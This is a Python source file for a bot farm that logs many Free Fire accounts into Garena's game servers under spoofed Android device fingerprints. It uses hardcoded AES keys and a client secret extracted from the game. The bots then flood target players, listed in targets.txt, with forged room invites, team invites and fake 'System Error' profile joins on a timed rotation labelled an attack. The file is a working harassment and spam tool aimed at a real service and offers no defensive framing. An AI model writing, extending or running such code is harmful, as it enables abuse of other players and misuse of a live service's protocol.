# -*- coding: utf-8 -*-
# START OF FILE main.py

import os, psutil, sys, jwt, json, binascii, time, urllib3, base64, re, socket, threading
import asyncio, gc, random, aiohttp
import uuid
from io import BytesIO
from protobuf_decoder.protobuf_decoder import Parser
from google.protobuf.timestamp_pb2 import Timestamp
from threading import Thread, Lock
import datetime as dt_mod

# central db coordinator import
import data_coordinator

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ==========================================
# === xKEys INLINE PROTOBUF DESCRIPTOR ===
# ==========================================
from google.protobuf.internal import builder as _builder
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database

_sym_db = _symbol_database.Default()
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(
    b'\n\x10my_message.proto\">\n\tMyMessage\x12\x0f\n\x07\x66ield21\x18\x15 \x01(\x03'
    b'\x12\x0f\n\x07\x66ield22\x18\x16 \x01(\x0c\x12\x0f\n\x07\x66ield23\x18\x17 \x01(\x0c\x62\x06proto3'
)
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'xKEys', globals())

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# === xC4.py LOGIC & ENCRYPTION KEYS ===
# ==========================================
Key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
Iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

def Ua():
    agents = [
        "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
        "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
        "Dalvik/2.1.0 (Linux; U; Android 11; RMX3231 Build/RP1A.201005.001)"
    ]
    return random.choice(agents)

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(bytes.fromhex(HeX), AES.block_size)).hex()

def EnC_PacKeT(HeX, K, V):
    return AES.new(K, AES.MODE_CBC, V).encrypt(pad(bytes.fromhex(HeX), 16)).hex()

def DEc_PacKeT(HeX, K, V):
    return unpad(AES.new(K, AES.MODE_CBC, V).decrypt(bytes.fromhex(HeX)), 16).hex()

def DecodE_HeX(H):
    R = hex(H)
    F = str(R)[2:]
    if len(F) == 1: F = "0" + F
    return F

def EnC_Vr(N):
    if N < 0: return b''
    H = []
    while True:
        BesTo = N & 0x7F; N >>= 7
        if N: BesTo |= 0x80
        H.append(BesTo)
        if not N: break
    return bytes(H)

def CrEaTe_VarianT(f, v):
    return EnC_Vr((f << 3) | 0) + EnC_Vr(v)

def CrEaTe_LenGTh(f, v):
    encoded = v.encode() if isinstance(v, str) else v
    return EnC_Vr((f << 3) | 2) + EnC_Vr(len(encoded)) + encoded

def CrEaTe_ProTo(fields):
    packet = bytearray()
    for field, value in fields.items():
        if isinstance(value, dict):
            nested = CrEaTo = CrEaTe_ProTo(value)
            packet.extend(CrEaTe_LenGTh(field, nested))
        elif isinstance(value, int):
            packet.extend(CrEaTe_VarianT(field, value))
        elif isinstance(value, (str, bytes)):
            packet.extend(CrEaTe_LenGTh(field, value))
    return packet

def GeneRaTePk(Pk, N, K, V):
    PkEnc = EnC_PacKeT(Pk, K, V)
    _ = DecodE_HeX(int(len(PkEnc) // 2))
    head = N + ("000000" if len(_) == 2 else "00000" if len(_) == 3 else "0000")
    return bytes.fromhex(head + _ + PkEnc)

def Fix_PackEt(parsed_results):
    result_dict = {}
    for result in parsed_results:
        field_data = {}
        field_data['wire_type'] = result.wire_type
        if result.wire_type == "varint": field_data['data'] = result.data
        elif result.wire_type == "string": field_data['data'] = result.data
        elif result.wire_type == "bytes": field_data['data'] = result.data
        elif result.wire_type == 'length_delimited': field_data["data"] = Fix_PackEt(result.data.results)
        result_dict[result.field] = field_data
    return result_dict

def DeCode_PackEt(input_text):
    try:
        parsed_results = Parser().parse(input_text)
        return json.dumps(Fix_PackEt(parsed_results))
    except: return None

# ==========================================
# === PACKET GENERATORS (STRICT REDUCED) ===
# ==========================================

def Build_Initial_Team_Packet(bot_uid, region, key, iv, team_size=5):
    try:
        packet_id = "0515"
        if region:
            if region.lower() == "bd": packet_id = "0519"
            elif region.lower() == "ind": packet_id = "0514"
            
        fields_open = {1: 1, 2: {2: "\u0001", 3: 1, 4: 1, 5: "en", 9: 1, 11: 1, 13: 1, 14: {2: 5756, 6: 11, 8: "1.126.1", 9: 2, 10: 4}}}
        open_sq_packet = GeneRaTePk(CrEaTe_ProTo(fields_open).hex(), packet_id, key, iv)
        
        game_mode = random.choice([1, 2, 62, 73])
        fields_change = {1: 17, 2: {1: int(bot_uid), 2: 1, 3: int(team_size - 1), 4: int(game_mode), 5: "\u001a", 8: 5, 13: 329}}
        change_sq_packet = GeneRaTePk(CrEaTe_ProTo(fields_change).hex(), packet_id, key, iv)
        
        return [open_sq_packet, change_sq_packet]
    except Exception:
        return []

def Simple_Invite_Packet(target_uid, region, key, iv):
    packet_id = '0515'
    if region == 'BD': packet_id = '0519'
    elif region == 'IND': packet_id = '0514'
    fields = {1: 2, 2: {1: int(target_uid), 2: region, 4: 1}}
    return GeneRaTePk(str(CrEaTe_ProTo(fields).hex()), packet_id, key, iv)

def Leave_Team_Packet(uid, region, key, iv):
    packet_id = '0515'
    if region == 'BD': packet_id = '0519'
    elif region == 'IND': packet_id = '0514'
    fields = {1: 7, 2: {1: int(uid)}}
    return GeneRaTePk(str(CrEaTe_ProTo(fields).hex()), packet_id, key, iv)

def Open_Room_Packet(K, V):
    fields = {
        1: 2,  
        2: {   
            1: 1, 2: 15, 3: 5, 4: "Xyron", 5: "1", 6: 12, 7: 1, 8: 1, 9: 1,
            11: 1, 12: 2, 14: 36981056,
            15: {1: "IDC3", 2: 126, 3: "ME"},
            16: "\u0001\u0003\u0004\u0007\t\n\u000b\u0012\u000f\u000e\u0016\u0019\u001a \u001d",
            18: 2368584, 27: 1, 34: "\u0000\u0001", 40: "en", 48: 1,
            49: {1: 21},
            50: {1: 36981056, 2: 2368584, 5: 2}
        }
    }
    return GeneRaTePk(str(CrEaTe_ProTo(fields).hex()), '0E15', K, V)

def Room_Invite_Packet(target_uid, K, V):
    fields = {1: 22, 2: {1: int(target_uid)}}
    return GeneRaTePk(str(CrEaTe_ProTo(fields).hex()), '0E15', K, V)

def xBunnEr():
    return random.choice([10001, 10002, 10003, 10004, 10005])

def Fake_Profile_Join(target_uid, region, K, V):
    packet_id = '0515'
    if region == 'BD': packet_id = '0519'
    elif region == 'IND': packet_id = '0514'

    badge_list = [64, 4096, 8192, 16384, 32768, 1048576]
    selected_badge = random.choice(badge_list)
    random_rank_score = random.choice([1000, 9999, 20000, 5000, 3210])
    fake_team_id = random.randint(2000000000, 3000000000)

    fields = {
        1: 33, 
        2: {
            1: int(target_uid),
            2: region if region else "BD",
            3: int(fake_team_id),  
            4: 2,                  
            5: bytes([1, 7, 9, 10, 11, 18, 25, 26, 32]), 
            6: "[FF0000]System[FFFF00]Error", 
            7: 330,
            8: random_rank_score, 
            9: 100,
            10: "DZ",
            11: bytes([49, 97, 99, 52, 98, 56, 48, 101, 99, 102, 48, 52, 55, 56, 97, 52, 52, 50, 48, 51, 98, 102, 56, 102, 97, 99, 54, 49, 50, 48, 102, 53]), 
            12: 1,
            13: int(target_uid),
            14: {
                1: 2203434355,
                2: 8,
                3: b"\x10\x15\x08\n\x0b\x13\x0c\x0f\x11\x04\x07\x02\x03\r\x0e\x12\x01\x05\x06"
            },
            16: 1, 17: 1, 18: 312, 19: 46,
            23: bytes([16, 1, 24, 1]), 
            24: xBunnEr(), 
            26: "", 28: "",
            31: {1: 1, 2: selected_badge}, 
            32: selected_badge,
            34: {
                1: int(target_uid), 
                2: 8, 
                3: bytes([15,6,21,8,10,11,19,12,17,4,14,20,7,2,1,5,16,3,13,18])
            }
        }
    }
    return GeneRaTePk(str(CrEaTe_ProTo(fields).hex()), packet_id, K, V)

# ==========================================
# === VERIFIED DEVICE PROFILES ===
# ==========================================
DEVICE_PROFILES = [
    {
        "os": "Android OS 12 / API-31",
        "cpu_short": "exynos2100",
        "cpu_long": "Exynos 2100 | 8 cores",
        "gpu": "Mali-G78 MP14",
        "opengl": "OpenGL ES 3.2 v1.r26p0",
        "width": 1080,
        "height": 2400,
        "dpi": "420",
        "ram": 8192,
        "operator": "Grameenphone"
    },
    {
        "os": "Android OS 11 / API-30",
        "cpu_short": "sm7150",
        "cpu_long": "Qualcomm Snapdragon 732G | 8 cores",
        "gpu": "Adreno (TM) 618",
        "opengl": "OpenGL ES 3.2 V@502.0",
        "width": 1080,
        "height": 2400,
        "dpi": "440",
        "ram": 6144,
        "operator": "Robi"
    },
    {
        "os": "Android OS 13 / API-33",
        "cpu_short": "sm8350",
        "cpu_long": "Qualcomm Snapdragon 888 | 8 cores",
        "gpu": "Adreno (TM) 660",
        "opengl": "OpenGL ES 3.2 V@512.0",
        "width": 1440,
        "height": 3216,
        "dpi": "520",
        "ram": 12288,
        "operator": "Banglalink"
    }
]

# ==========================================
# === SINGLETON PORT MUTEX LOCK ===
# ==========================================
def enforce_singleton_lock(port=59288):
    global _lock_socket
    _lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        _lock_socket.bind(('127.0.0.1', port))
    except socket.error:
        print("[FATAL] Another main.py instance is running. Terminating to avoid collision.")
        sys.exit(0)

# ==========================================
# === ZOMBIE PROCESS KILLER ===
# ==========================================
def Kill_Zombie_Processes():
    current_pid = os.getpid()
    for p in psutil.process_iter(['pid', 'cmdline']):
        try:
            cmd = p.info['cmdline']
            if cmd and 'main.py' in ' '.join(cmd) and 'python' in ' '.join(cmd).lower():
                if p.info['pid'] != current_pid:
                    print(f"[!] Killing Zombie main.py (PID: {p.info['pid']})")
                    p.kill()
        except: pass

Kill_Zombie_Processes()

# ==========================================
# === GLOBAL STATE CONTROLLERS ===
# ==========================================
ATTACK_TARGETS_DICT = {} 
TARGET_FILE = "targets.txt"
LIVE_STATUS_FILE = "bots_live_status.json" 

BOT_STATUS_DATA = {}
STATUS_LOCK = Lock()
TOTAL_BOTS_DICT = {} 
PENDING_LOGINS = set()

HTTP_SESSION = None

async def get_http_session():
    global HTTP_SESSION
    if HTTP_SESSION is None:
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        HTTP_SESSION = aiohttp.ClientSession(connector=connector)
    return HTTP_SESSION

# ==========================================
# === STATE MANAGEMENT & STATUS CLEANERS ===
# ==========================================
def save_bad_account(uid, source="vv.json", reason="Login Failed"):
    bad_data = data_coordinator.load_data('bad_accounts.json', [])
    bad_data.append({
        "uid": str(uid),
        "source": source,
        "reason": reason,
        "time": dt_mod.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    data_coordinator.save_data('bad_accounts.json', bad_data)

def Update_Bot_Status(bot_id, status_msg, uid="Unknown", nickname="Unknown", vv_key="Unknown"):
    with STATUS_LOCK:
        BOT_STATUS_DATA[str(bot_id)] = {
            "Id": vv_key,
            "Name": nickname,
            "Status": status_msg,
            "Timestamp": dt_mod.datetime.now().strftime("%H:%M:%S"),
            "Game uid": uid
        }

def Remove_Bot_Status(bot_id):
    with STATUS_LOCK:
        bot_id_str = str(bot_id)
        if bot_id_str in BOT_STATUS_DATA:
            del BOT_STATUS_DATA[bot_id_str]
        try:
            data_coordinator.save_data(LIVE_STATUS_FILE, BOT_STATUS_DATA.copy())
        except:
            pass

def Live_Status_Writer():
    while True:
        try:
            with STATUS_LOCK:
                data_to_save = BOT_STATUS_DATA.copy()
            data_coordinator.save_data(LIVE_STATUS_FILE, data_to_save)
        except: pass
        time.sleep(10) 

def ResTarTinG():
    print('\n [System] Restarting System Internally... ! ')
    try:
        p = psutil.Process(os.getpid())
        for f in p.open_files():
            try: os.close(f.fd)
            except: pass
        for conn in p.net_connections(kind='inet'):
            try: os.close(conn.fd)
            except: pass
    except: pass
    time.sleep(0.5)
    os.execl(sys.executable, sys.executable, *sys.argv)

def AuTo_ResTartinG():
    while True:
        time.sleep(6 * 60 * 60)
        ResTarTinG()

# ==========================================
# === GARENA HANDSHAKE APIS ===
# ==========================================
async def G_AccEss(U, P):
    session = await get_http_session()
    UrL = "https://100067.connect.garena.com/oauth/guest/token/grant"
    HE = {
        "Host": "100067.connect.garena.com", 
        "Content-Type": "application/x-www-form-urlencoded", 
        "Accept-Encoding": "gzip", 
        "Connection": "keep-alive"
    }
    dT = {
        "uid": f"{U}", "password": f"{P}", "response_type": "token", 
        "client_type": "2", "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3", 
        "client_id": "100067"
    }
    try:
        async with session.post(UrL, headers=HE, data=dT, timeout=10) as R:
            if R.status == 200:
                data = await R.json()
                return data["access_token"], data["open_id"]
    except: pass
    return None, None

async def MajorLoGin(PyL):
    session = await get_http_session()
    url = "https://loginbp.ggblueshark.com/MajorLogin"
    headers = {
        "X-Unity-Version": "2018.4.11f1", 
        "ReleaseVersion": "OB54",  # UPDATED TO OB54 FOR GARENA HANDSHAKE
        "Content-Type": "application/x-www-form-urlencoded", 
        "X-GA": "v1 1", 
        "Host": "loginbp.ggblueshark.com", 
        "Connection": "Keep-Alive", 
        "Accept-Encoding": "gzip"
    }
    try:
        async with session.post(url, data=PyL, headers=headers, timeout=15) as response:
            if response.status in [200, 201]:
                raw_data = await response.read()
                return raw_data.hex()
    except Exception: pass
    return None

# ==========================================
# === FF CLIENT CLASS ===
# ==========================================
class FF_CLient:
    def __init__(self, U, P, bot_id):
        self.bot_uid = None
        self.nickname = "Unknown"
        self.vv_key = U
        self.bot_id = bot_id 
        self.writer2 = None
        self.reader2 = None
        self.read_task = None
        self.attack_task = None
        self.active_spam_tasks = []
        self.is_running = True
        self.region = "BD" 
        self.key = None
        self.iv = None
        self.device = DEVICE_PROFILES[(bot_id - 1) % len(DEVICE_PROFILES)]

    async def STarT(self, JwT_ToKen, AutH_ToKen, ip, port, ip2, port2, key, iv, bot_uid):
        self.key = key
        self.iv = iv
        await self.OnLinE(ip2, port2, AutH_ToKen, bot_uid, key, iv)

    async def Garena_Reader_Loop(self):
        try:
            while self.is_running and self.writer2 and not self.writer2.is_closing():
                data = await self.reader2.read(9999)
                if not data:
                    break
        except Exception: 
            pass

    async def OnLinE(self, host2, port2, tok, bot_uid, key, iv):
        disconnect_count = 0
        while self.is_running:
            try:
                self.reader2, self.writer2 = await asyncio.open_connection(host2, int(port2))
                self.read_task = asyncio.create_task(self.Garena_Reader_Loop())
                
                self.writer2.write(bytes.fromhex(tok))
                await self.writer2.drain()
                await asyncio.sleep(1.0) 
                
                Update_Bot_Status(self.bot_id, "✅ Online & Idle", bot_uid, self.nickname, self.vv_key)
                disconnect_count = 0 
                
                # self-driving attack চালু করা হচ্ছে
                self.attack_task = asyncio.create_task(self.Self_Driving_Attack(bot_uid, self.region, key, iv))
                
                await self.read_task
                        
            except Exception: 
                if self.writer2:
                    try: self.writer2.close()
                    except: pass
                self.writer2 = None 
                
                if self.read_task and not self.read_task.done():
                    self.read_task.cancel()
                if self.attack_task and not self.attack_task.done():
                    self.attack_task.cancel()
                
                disconnect_count += 1
                if disconnect_count >= 3:
                    print(f" [Bot #{self.bot_id}] ❌ Connection failed permanently.")
                    save_bad_account(self.vv_key, "vv.json", "Attack Connection Failed (3x)")
                    self.is_running = False
                    Remove_Bot_Status(self.bot_id)
                    break 
                
                Update_Bot_Status(self.bot_id, f"⚠️ Reconnecting ({disconnect_count}/3)...", bot_uid, self.nickname, self.vv_key)
                await asyncio.sleep(5)

    def get_cached_packets(self, target, bot_uid, region, key, iv):
        team_size = random.choice([5, 6])
        return {
            'room_open': Open_Room_Packet(key, iv),
            'room_inv': Room_Invite_Packet(target, key, iv),
            'team': Build_Initial_Team_Packet(bot_uid, region, key, iv, team_size),
            'fake_join': Fake_Profile_Join(target, region, key, iv),
            'invite': Simple_Invite_Packet(target, region, key, iv)
        }

    async def safe_socket_write(self, data):
        try:
            if self.writer2 and not self.writer2.is_closing():
                self.writer2.write(data)
                await self.writer2.drain()
        except Exception:
            self.writer2 = None

    async def Spam_Single_Target(self, target, bot_uid, region, key, iv):
        try:
            if not self.writer2 or self.writer2.is_closing() or not self.is_running:
                return

            pkts = self.get_cached_packets(target, bot_uid, region, key, iv)
            
            room_bytes = pkts['room_open'] + pkts['room_inv']
            team_join_bytes = b"".join(pkts['team']) + pkts['fake_join']
            team_invite_bytes = b"".join(pkts['team']) + pkts['invite']

            # --- Exact 2.5-Second Sequence ---

            await self.safe_socket_write(room_bytes)
            await asyncio.sleep(0.6)
            
            await self.safe_socket_write(team_join_bytes)
            await asyncio.sleep(0.6)

            await self.safe_socket_write(room_bytes)
            await asyncio.sleep(0.6)
            
            await self.safe_socket_write(team_join_bytes)
            await asyncio.sleep(0.6)
            
            await self.safe_socket_write(room_bytes)
            await asyncio.sleep(0.6)
            
            await self.safe_socket_write(team_invite_bytes)


        except Exception: 
            self.writer2 = None

    # ==========================================
    # === INTEGRATED SELF DRIVING ATTACK ===
    # ==========================================
    async def Self_Driving_Attack(self, bot_uid, region, key, iv):
        while self.is_running:
            try:
                if not self.writer2: 
                    await asyncio.sleep(1); continue 

                if not ATTACK_TARGETS_DICT:
                    Update_Bot_Status(self.bot_id, "💤 Idle (No Targets)", bot_uid, self.nickname, self.vv_key)
                    await asyncio.sleep(2); continue

                # 🛑 3.6 SECONDS ROTATION BARRIER 🛑
                now = time.time()
                sleep_time = 3.6 - (now % 3.6)
                await asyncio.sleep(sleep_time)
                
                total_lists = len(ATTACK_TARGETS_DICT)
                if total_lists == 0: continue
                
                ROTATION_STEP = int(time.time() / 3.6)
                my_list_id = ((self.bot_id + ROTATION_STEP - 1) % total_lists) + 1
                my_targets = ATTACK_TARGETS_DICT.get(str(my_list_id), [])
                
                # 🛑 লিস্ট থেকে শুধুমাত্র ১টি UID নেওয়া হবে
                my_targets = my_targets[:1]
                
                if my_targets:
                    Update_Bot_Status(self.bot_id, f"🔥 Spamming List-{my_list_id}", bot_uid, self.nickname, self.vv_key)
                    self.active_spam_tasks = [t for t in self.active_spam_tasks if not t.done()]
                    
                    for t in my_targets:
                        task = asyncio.create_task(self.Spam_Single_Target(t, bot_uid, region, key, iv))
                        self.active_spam_tasks.append(task)
                else:
                    Update_Bot_Status(self.bot_id, "💤 Idle", bot_uid, self.nickname, self.vv_key)

            except Exception:
                await asyncio.sleep(1)

    def GeT_Key_Iv(self, serialized_data):
        my_message = getattr(sys.modules[__name__], 'MyMessage', None)
        if not my_message:
            from google.protobuf import message_factory
            my_message = message_factory.GetMessageClass(DESCRIPTOR.message_types_by_name['MyMessage'])
        
        msg = my_message()
        msg.ParseFromString(serialized_data)
        ts_obj = Timestamp()
        ts_obj.FromNanoseconds(msg.field21)
        return ts_obj.seconds * 1_000_000_000 + ts_obj.nanos, msg.field22, msg.field23

    async def GeT_LoGin_PorTs(self, JwT_ToKen, PayLoad, bot_uid, auth_url):
        session = await get_http_session()
        nickname = "Unknown"
        
        async def fetch_nickname():
            try:
                api_url = f"https://munna2233.vercel.app/player-info?uid={bot_uid}"
                async with session.get(api_url, timeout=7) as api_res:
                    if api_res.status == 200:
                        data = await api_res.json()
                        return data.get('basic_info', {}).get('nickname', 'Unknown')
            except: pass
            return "Unknown"

        async def fetch_garena_data():
            url = f"{auth_url}/GetLoginData" 
            headers = {
                "Authorization": f"Bearer {JwT_ToKen}", 
                "ReleaseVersion": "OB54",  # UPDATED TO OB54
                "Content-Type": "application/x-www-form-urlencoded", 
                "X-GA": "v1 1",
                "X-Unity-Version": "2018.4.11f1"
            }
            try:
                async with session.post(url, headers=headers, data=PayLoad, timeout=15) as res:
                    if res.status == 200:
                        raw = await res.read()
                        return raw.hex()
            except Exception: pass
            return None

        nick_task = asyncio.create_task(fetch_nickname())
        data_task = asyncio.create_task(fetch_garena_data())
        nickname, hex_data = await asyncio.gather(nick_task, data_task)

        if hex_data:
            try:
                data = json.loads(DeCode_PackEt(hex_data))
                if nickname == "Unknown":
                    nickname = data.get("4", {}).get("data", "Unknown")
                    
                a1, a2 = data["32"]["data"], data["14"]["data"]
                return a1[:-6], a1[-5:], a2[:-6], a2[-5:], nickname
            except: pass
        return None, None, None, None, nickname

    async def ToKen_GeneRaTe(self, U, P):
        try:
            acc, open_id = await G_AccEss(U, P)
            if not acc: return None
            
            total_storage = random.randint(30000, 60000)
            avail_storage = random.randint(10000, 29000)
            total_internal = random.randint(2000, 4000)
            avail_internal = random.randint(500, 1500)
            avail_game_disk = random.randint(20000, 25000)
            total_game_disk = random.randint(25000, 28000)
            
            pyl = {
                3: str(dt_mod.datetime.now())[:-7],
                4: "free fire",
                5: 2,
                7: "1.126.1", # UPDATED APP VERSION (OB54)
                8: self.device["os"],
                9: self.device["cpu_short"],
                10: self.device["operator"], 
                11: random.choice(["WIFI", "4G", "5G"]),
                12: self.device["width"],
                13: self.device["height"],
                14: self.device["dpi"], 
                15: self.device["cpu_long"],
                16: self.device["ram"],
                17: self.device["gpu"], 
                18: self.device["opengl"], 
                19: f"Google|{uuid.uuid4()}",
                20: f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                21: "en",
                22: open_id, 
                23: "4",
                24: "Handheld",
                25: {6: 55, 8: random.randint(70, 99)},
                29: acc,
                30: 2, 41: self.device["operator"],
                42: "WIFI", 
                57: "7428b253defc164018c604a1ebbfebdf",
                60: total_storage,
                61: avail_storage,
                62: total_internal,
                63: avail_internal, 
                64: avail_game_disk,
                65: total_game_disk,
                66: avail_storage,
                67: total_storage,
                73: 3, 
                74: "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64",
                76: 1, 
                77: "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk", 
                78: 3,
                79: 2,
                81: "64",
                83: "2019120775", # UPDATED APP VERSION CODE (OB54)
                86: "OpenGLES2", 87: 16383, 88: 4, 
                89: b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg==", 
                92: random.randint(8000, 18000),
                93: "android", 94: "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY=", 
                95: 110009, 97: 2, 98: 0, 99: "4", 100: "4"
            }
            
            proto_pyl = CrEaTe_ProTo(pyl)
            payload_hex = proto_pyl.hex()
            final_payload = bytes.fromhex(EnC_AEs(payload_hex))
            
            resp = await MajorLoGin(final_payload)
            if resp:
                besto = json.loads(DeCode_PackEt(resp))
                uid = besto["1"]["data"]
                jwt_token = besto["8"]["data"]
                auth_url = besto.get("10", {}).get("data", "https://clientbp.ggblueshark.com")
                ts, key, iv = self.GeT_Key_Iv(bytes.fromhex(resp))
                ip, port, ip2, port2, nickname = await self.GeT_LoGin_PorTs(jwt_token, final_payload, uid, auth_url)
                
                if ip and port:
                    return (jwt_token, key, iv, ts, ip, port, ip2, port2, uid, nickname)
        except Exception: pass
        return None

    async def Get_FiNal_ToKen_0115(self, U, P):
        for attempt in range(1, 4):
            print(f"[Bot #{self.bot_id}] ⏳ Trying Login ({attempt}/3) [OB54 Mode]...")
            res = await self.ToKen_GeneRaTe(U, P)
            if res:
                token, key, iv, ts, ip, port, ip2, port2, bot_uid, nickname = res
                self.bot_uid = bot_uid
                self.nickname = nickname
                
                print("="*50)
                print(f"✅ LOGIN SUCCESSFUL! [Bot #{self.bot_id}]")
                print(f"👤 NAME: {self.nickname}") 
                print(f"🆔 UID : {self.bot_uid}")  
                print("="*50)
                
                acc_id = jwt.decode(token, options={"verify_signature": False}).get("account_id")
                enc_acc = hex(acc_id)[2:]
                
                ts_hex = DecodE_HeX(ts)
                token_enc = EnC_PacKeT(token.encode().hex(), key, iv)
                zeros = "0000000" if len(enc_acc) == 9 else "00000000"
                self.AutH_ToKen = f"0115{zeros}{enc_acc}{ts_hex}00000{hex(len(token_enc)//2)[2:]}{token_enc}"
                
                asyncio.create_task(self.STarT(token, self.AutH_ToKen, ip, port, ip2, port2, key, iv, bot_uid))
                return True
            await asyncio.sleep(2)
            
        print(f" [Bot #{self.bot_id}] ❌ Login Failed 3 times. Removing and saving to bad_accounts.")
        save_bad_account(U, "vv.json", "Attack Login Failed (3x)")
        self.is_running = False
        Remove_Bot_Status(self.bot_id)
        return False

# ==========================================
# === DYNAMIC FILE WATCHERS (ASYNC) ===
# ==========================================

async def Target_Loader_Async():
    global ATTACK_TARGETS_DICT
    if not os.path.exists(TARGET_FILE):
        with open(TARGET_FILE, "w") as f: json.dump({"1":[]}, f)
    prev_targets = ""
    while True:
        try:
            data = data_coordinator.load_data(TARGET_FILE, {})
            curr = json.dumps(data, sort_keys=True)
            if curr != prev_targets:
                ATTACK_TARGETS_DICT = data
                prev_targets = curr
                print(" [UPDATE] Target List Refreshed")
        except: pass
        await asyncio.sleep(5)

async def Sequential_VV_Watcher_Async():
    global TOTAL_BOTS_DICT
    while True:
        try:
            current_accounts = data_coordinator.load_data("vv.json", {})
            
            for active_uid in list(TOTAL_BOTS_DICT.keys()):
                if active_uid not in current_accounts:
                    print(f" [-] Removing Bot: {active_uid}")
                    bot_obj = TOTAL_BOTS_DICT.pop(active_uid)
                    bot_obj.is_running = False
                    if bot_obj.writer2:
                        try: bot_obj.writer2.close()
                        except: pass
                    
                    if bot_obj.attack_task and not bot_obj.attack_task.done():
                        bot_obj.attack_task.cancel()
                    
                    Remove_Bot_Status(bot_obj.bot_id)

            to_login = []
            for u in sorted(list(current_accounts.keys())):
                if u not in TOTAL_BOTS_DICT and u not in PENDING_LOGINS:
                    to_login.append(u)

            for u in to_login:
                PENDING_LOGINS.add(u)
                p = current_accounts[u]
                reg = "BD"
                pwd = p
                if isinstance(p, dict):
                    pwd = p.get("password", p)
                    reg = p.get("region", "BD")
                
                print(f" [+] Queued Sequential Login for: {u} on Region: {reg}")
                
                temp_id = len(TOTAL_BOTS_DICT) + 1
                new_bot = FF_CLient(u, pwd, temp_id)
                new_bot.region = reg
                
                success = await new_bot.Get_FiNal_ToKen_0115(u, pwd)
                if success:
                    TOTAL_BOTS_DICT[u] = new_bot
                
                PENDING_LOGINS.remove(u)
                await asyncio.sleep(2.0)

        except Exception as e:
            print(f"[!] Error in Sequential VV Watcher: {e}")
        await asyncio.sleep(5)

async def StarT_SerVer_Async():
    await get_http_session()

    if os.path.exists(LIVE_STATUS_FILE):
        try: os.remove(LIVE_STATUS_FILE)
        except: pass
        
    Thread(target=Live_Status_Writer, daemon=True).start()
    Thread(target=AuTo_ResTartinG, daemon=True).start()
    
    asyncio.create_task(Target_Loader_Async())
    asyncio.create_task(Sequential_VV_Watcher_Async())
    
    print("\n [🚀] Main Attack Server Running (Perfect Ref Alignment)")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    enforce_singleton_lock(59288)
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(StarT_SerVer_Async())
    except KeyboardInterrupt:
        print("\n[STOP] Bot Stopped Manually.")

# END OF FILE main.py